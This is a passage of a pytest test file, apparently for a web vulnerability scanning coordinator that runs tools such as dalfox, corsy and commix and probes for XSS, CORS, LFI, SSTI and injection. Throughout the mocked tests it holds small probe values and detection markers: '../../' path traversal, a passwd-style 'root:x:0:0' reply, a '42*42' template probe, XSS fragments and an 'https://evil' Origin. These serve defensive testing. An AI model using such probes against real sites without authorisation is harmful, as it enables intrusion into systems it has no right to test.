            return FakeCompleted(returncode=0 if cmd[1] == "arjun" else 1, stdout="")
        return FakeCompleted(returncode=1, stdout="")
    monkeypatch.setattr(apc.subprocess, "run", fake_run)
    result = apc.setup_payload_tools(tools_limit={"arjun", "dalfox"})
    assert result["tools"] == ["arjun"]
    assert result["failed"] == ["dalfox"]
    assert any(call[0] == "go" for call in calls)


def test_request_wrappers_cover_body_query_headers_and_errors(monkeypatch):
    seen = []
    monkeypatch.setattr(apc.requests, "request", lambda *args, **kwargs: (seen.append(kwargs), FakeResponse("ok"))[1])
    get_cfg = apc.RequestConfig("https://t", "GET", cookies={"sid": "1"}, headers={"X": "y"})
    post_cfg = apc.RequestConfig("https://t", "POST")
    assert apc._requests_get_text("https://t", {"q": "x"}, get_cfg) == "ok"
    assert seen[-1]["params"] == {"q": "x"} and seen[-1]["data"] is None
    assert apc._requests_get_text("https://t", {"q": "x"}, post_cfg) == "ok"
    assert seen[-1]["data"] == {"q": "x"} and seen[-1]["params"] is None
    monkeypatch.setattr(apc.requests, "request", Mock(side_effect=RuntimeError("down")))
    assert apc._requests_get_text("https://t", {}, get_cfg) is None

    monkeypatch.setattr(apc.requests, "head", lambda *args, **kwargs: FakeResponse("", headers={"X-Test": "yes"}))
    assert apc._requests_head_raw_headers("https://t", {"Origin": "https://evil"}, get_cfg) == "X-Test: yes"
    monkeypatch.setattr(apc.requests, "head", Mock(side_effect=RuntimeError("down")))
    assert apc._requests_head_raw_headers("https://t", {}, get_cfg) is None


def test_parameter_discovery_uses_provided_url_and_baseline_differences(monkeypatch):
    responses = iter([FakeResponse("", status_code=200, headers={"Content-Length": "100"})] + [
        FakeResponse("", status_code=200, headers={"Content-Length": "200"}) for _ in range(40)
    ])
    monkeypatch.setattr(apc.requests, "request", lambda *args, **kwargs: next(responses))
    cfg = apc.RequestConfig("https://example.test/page?existing=1", "GET")
    found = apc.advanced_parameter_discovery(cfg, " provided, ", tools=[])
    assert "provided" in found and "existing" in found
    discovered = apc.advanced_parameter_discovery(apc.RequestConfig("https://example.test/page", "GET"), None, tools=[])
    assert "id" in discovered
def test_xss_dalfox_parses_vulnerable_reflected_and_negative_results(monkeypatch):
    payloads = [
        {"type": "V", "param": "q", "inject_type": "inHTML", "payload": "<x>", "message_str": "hit"},
        {"type": "R", "param": "r", "inject_type": "inJS", "payload": "x", "evidence": "reflected"},
        {"type": "R", "param": "r2", "inject_type": "inHTML", "payload": "y"},
    ]
    monkeypatch.setattr(apc.subprocess, "run", lambda *args, **kwargs: FakeCompleted(stdout=json.dumps(payloads)))
    cfg = apc.RequestConfig("https://t/page", "POST", cookies={"sid": "1"}, headers={"X": "v"})
    result = apc._coordinate_xss_testing(cfg, ["q", "r", "other"], tools=["dalfox"])
    assert any(item.get("vulnerable") for item in result)
    assert sum(item.get("vulnerable") is False for item in result) >= 2


def test_corsy_reports_positive_and_negative(monkeypatch):
    monkeypatch.setattr(apc.subprocess, "run", lambda *a, **k: FakeCompleted(stdout="severity: high"))
    positive = apc._test_cors_configurations(apc.RequestConfig("https://t"), tools=["corsy"])
    assert positive[0]["vulnerable"] is True
    monkeypatch.setattr(apc.subprocess, "run", lambda *a, **k: FakeCompleted(stdout="clean"))
    negative = apc._test_cors_configurations(apc.RequestConfig("https://t"), tools=["corsy"])
    assert negative[0]["vulnerable"] is False


def test_custom_injection_paths_detect_lfi_ssti_and_ldap(monkeypatch):
    def fake_get(url, params, request_config, timeout=10):
        value = next(iter(params.values()))
        if "42*42" in value:
            return "result 1764"
        if value.startswith("../../"):
            return "root:x:0:0"
        if value.startswith("*"):
            return "LDAP invalid dn"
        return "safe"

    monkeypatch.setattr(apc, "_requests_get_text", fake_get)
    cfg = apc.RequestConfig("https://t/page", "GET")
    kinds = set()
    for focus in ("LFI", "SSTI", "LDAP Injection"):
        result = apc._coordinate_injection_testing(cfg, ["p"], tools=[], focus_injection_types={focus})
        kinds.update(item.get("injection_type") for item in result if item.get("vulnerable"))
    assert {"SSTI", "LDAP Injection"} <= kinds
def test_custom_xss_fallback_detects_raw_encoded_and_negative(monkeypatch):
    calls = []
    def fake_get(url, params, request_config, timeout=10):
        calls.append(params)
        payload = next(iter(params.values()))
        param = next(iter(params))
        if param == "raw":
            return payload
        if param == "encoded":
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        return "safe response"
    monkeypatch.setattr(apc, "_requests_get_text", fake_get)
    cfg = apc.RequestConfig("https://t/page", "GET")
    result = apc._coordinate_xss_testing(cfg, ["raw", "encoded", "none"], tools=[])
    assert any(item.get("vulnerable") is True for item in result)
    assert any(item.get("parameter") == "none" and item.get("vulnerable") is False for item in result)


def test_custom_xss_fallback_survives_request_errors(monkeypatch):
    monkeypatch.setattr(apc, "_requests_get_text", Mock(side_effect=RuntimeError("network")))
    result = apc._coordinate_xss_testing(apc.RequestConfig("https://t/page"), ["q"], tools=[])
    assert result == [{"parameter": "q", "vulnerable": False, "payload_type": "XSS tested", "tool": "custom"}]


def test_top_level_coordinator_returns_structured_error(monkeypatch):
    monkeypatch.setattr(apc, "setup_payload_tools", Mock(side_effect=RuntimeError("setup failed")))
    result = json.loads(apc.advanced_payload_coordinator("example.test", test_type="xss", parameters="q"))
    assert result["errors"]
    assert "setup failed" in str(result["errors"])


def test_cors_manual_coordinator_covers_wildcard_error_and_clean_responses(monkeypatch):
    cfg = apc.RequestConfig("https://target.test/path")
    origins = []

    def permissive(_url, headers, _request_config, timeout=10):
        origins.append(headers["Origin"])
        if len(origins) == 1:
            raise RuntimeError("transient request failure")
        return "Access-Control-Allow-Origin: *"

    monkeypatch.setattr(apc, "_requests_head_raw_headers", permissive)
    vulnerable = apc._test_cors_configurations(cfg, tools=[])
    assert vulnerable[0]["vulnerable"] is True
    assert vulnerable[0]["tool"] == "manual"

    monkeypatch.setattr(apc, "_requests_head_raw_headers", lambda *_args, **_kwargs: "Vary: Origin")
    clean = apc._test_cors_configurations(cfg, tools=[])
    assert clean == [{
        "vulnerable": False,
        "issue_type": "CORS Configuration",
        "description": "No obvious CORS misconfigurations detected",
        "tool": "manual",
    }]


def test_injection_coordinator_handles_tool_timeout_and_negative_summary(monkeypatch):
    timeout = apc.subprocess.TimeoutExpired("commix", 1, output="")
    monkeypatch.setattr(apc.subprocess, "run", Mock(side_effect=timeout))
    monkeypatch.setattr(apc, "_requests_get_text", lambda *_args, **_kwargs: "safe response")
    cfg = apc.RequestConfig("https://target.test/page", "POST", headers={"X-Test": "1"})

    result = apc._coordinate_injection_testing(
        cfg,
        ["q"],
        tools=["sstimap", "lfimap", "commix"],
        focus_injection_types={"Command Injection"},
    )

    assert result == [{
        "vulnerable": False,
        "url": "https://target.test/page",
        "parameter": "q",
        "method": "POST",
        "injection_type": "Command Injection",
        "tool": "custom",
    }]


def test_xss_dalfox_timeout_uses_partial_results_without_negative_summaries(monkeypatch):
    partial = json.dumps([{
        "type": "V",
        "param": "q",
        "inject_type": "inHTML",
        "payload": "<svg>",
        "evidence": "partial",
    }])
    monkeypatch.setattr(
        apc.subprocess,
        "run",
        Mock(side_effect=apc.subprocess.TimeoutExpired("dalfox", 1, output=partial)),
    )

    result = apc._coordinate_xss_testing(apc.RequestConfig("https://target.test"), ["q", "other"], ["dalfox"])

    assert result[0]["vulnerable"] is True
    assert all(item.get("parameter") != "other" for item in result)


def test_top_level_coordinator_exercises_get_to_post_runtime_orchestration(monkeypatch):
    """Test the controller's retry decisions without invoking external security tools."""
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": [], "failed": ["dalfox"]})
    discovery_methods = []

    def discover(config, _parameters, tools):
        discovery_methods.append(config.http_method)
        return [] if config.http_method == "GET" else ["q"]

    xss_methods = []

    def xss(config, parameters, tools=None, verbose=False):
        xss_methods.append(config.http_method)
        if config.http_method == "POST":
            return [{"parameter": parameters[0], "vulnerable": True, "payload_type": "XSS"}]
        return [{"parameter": parameters[0], "vulnerable": False, "payload_type": "XSS tested"}]

    monkeypatch.setattr(apc, "advanced_parameter_discovery", discover)
    monkeypatch.setattr(apc, "_coordinate_xss_testing", xss)
    result = json.loads(apc.advanced_payload_coordinator("https://target.test", test_type="xss"))

    assert discovery_methods == ["GET", "POST"]
    assert xss_methods == ["POST"]
    assert result["http_method"] == "POST"
    assert result["counts"]["vulnerabilities"] == 1


def test_top_level_injection_retry_restores_get_when_post_is_not_better(monkeypatch):
    monkeypatch.setattr(apc, "setup_payload_tools", lambda: {"tools": [], "failed": []})
    injection_methods = []

    def injection(config, parameters, tools=None, focus_injection_types=None, verbose=False):
        injection_methods.append((config.http_method, focus_injection_types))
        return [{"parameter": parameters[0], "vulnerable": False, "injection_type": "LFI"}]

    monkeypatch.setattr(apc, "_coordinate_injection_testing", injection)
    result = json.loads(
        apc.advanced_payload_coordinator("https://target.test", test_type="lfi", parameters="file")
    )

    assert injection_methods == [("GET", {"LFI"}), ("POST", {"LFI"})]
    assert result["http_method"] == "GET"
    assert result["counts"]["payload_results"] == 1


def test_setup_payload_tools_exercises_install_success_failure_and_exceptions(monkeypatch):
    calls = []

    def run(command, **_kwargs):
        calls.append(command)
        if command[0] == "which":
            return FakeCompleted(returncode=1)
        if command[:2] == ["go", "install"]:
            return FakeCompleted(returncode=0)
        if command[:2] == ["pip3", "install"] and command[-1] == "arjun":
            return FakeCompleted(returncode=1)
        if command[:2] == ["pip3", "install"] and command[-1] == "corsy":
            raise OSError("installer unavailable")
        return FakeCompleted(returncode=0)

    monkeypatch.setattr(apc.subprocess, "run", run)
    result = apc.setup_payload_tools(tools_limit={"dalfox", "arjun", "corsy", "paramspider"})

    assert result["tools"] == ["dalfox", "paramspider"]
    assert result["failed"] == ["arjun", "corsy"]
    assert any(command[:2] == ["go", "install"] for command in calls)


def test_parameter_discovery_parses_paramspider_output_and_tolerates_bad_urls(monkeypatch, tmp_path):
    output = tmp_path / "example.test-results.txt"
    output.write_text(
        "https://example.test/path?alpha=1&beta=2\n"
        "not a URL?still-not-valid\n"
        "https://example.test/without-query\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(apc.subprocess, "run", lambda *_args, **_kwargs: FakeCompleted(returncode=0))
    monkeypatch.setattr(apc.glob, "glob", lambda _pattern: [str(output), str(tmp_path / "missing.txt")])
    monkeypatch.setattr(
        apc.requests,
        "request",
        lambda *_args, **_kwargs: FakeResponse("", status_code=200, headers={"Content-Length": "1"}),
    )

    found = apc.advanced_parameter_discovery(
        apc.RequestConfig("https://example.test/path?seed=1"),
        provided_params="provided",
        tools=["paramspider"],
    )

    assert {"provided", "seed", "alpha", "beta"} <= set(found)


def test_result_file_and_input_validation_cover_cache_and_rejected_requests(monkeypatch, tmp_path):
    output = tmp_path / "nested" / "result.json"
    apc._write_result_file(str(output), "payload")
    assert output.read_text(encoding="utf-8") == "payload"
    apc._write_result_file(None, "ignored")

    with pytest.raises(ValueError, match="target_url"):
        apc.advanced_payload_coordinator("")
    with pytest.raises(ValueError, match="SQLi"):
        apc.advanced_payload_coordinator("target.test", test_type="sql_injection")
    with pytest.raises(ValueError, match="Directory/file"):
        apc.advanced_payload_coordinator("target.test", test_type="directory_brute_force")

    cached = json.dumps({"cached": True})
    monkeypatch.setattr(apc, "get_cached_result", lambda *_args: cached)
    output_file = tmp_path / "cached.json"
    assert apc.advanced_payload_coordinator("target.test", output_file=str(output_file)) == cached
    assert json.loads(output_file.read_text(encoding="utf-8"))["cached"] is True
